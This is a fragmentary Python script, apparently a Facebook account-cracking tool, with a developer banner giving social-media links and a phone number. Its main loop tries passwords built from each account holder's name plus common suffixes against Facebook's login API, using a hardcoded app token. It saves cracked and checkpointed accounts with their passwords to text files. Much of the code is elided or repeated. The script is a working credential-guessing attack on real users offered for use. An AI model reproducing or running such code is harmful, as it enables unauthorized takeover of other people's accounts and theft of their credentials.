...
..:::::..::....::..:::::..::........::
\033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: (꧁꧂꧁꧂RIAZKHAN ꧁꧂꧁꧂)
 \033[1;93m(*)\033[1;92m Facebook : https://www.facebook.com/Riaz-hacker-100835532473815/
 \033[1;93m(*)\033[1;92m Github   : https://github.com/Riazkiller
\033[1;93m(*)\033[1;92m  watsapp:  03188214452
"""
def tool():
	os.system("clear")
	print("")
...
def main():
	...
	print("")
	os.system('xdg-open htts://wa.me/03188314452')
	log_sel()
def log_sel():
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("RIAZKHANok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("RIAZKHANcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("RIAZKHANok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("RIAZKHANcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"786786"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("RIAZKHANok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("RIAZKHANcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"pakistan"
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("RIAZKHANok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("RIAZKHANcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+"098765"
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("RIAZKHANok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("RIAZKHANcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower()+"pakistan786"
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("RIAZKHANok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RIAZKHANcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()+"1234567890"
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [RIAZKHAN-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("RIAZKHANok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [RIAZKHAN-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("RIAZKHANcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [RIAZKHAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RIAZKHANcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
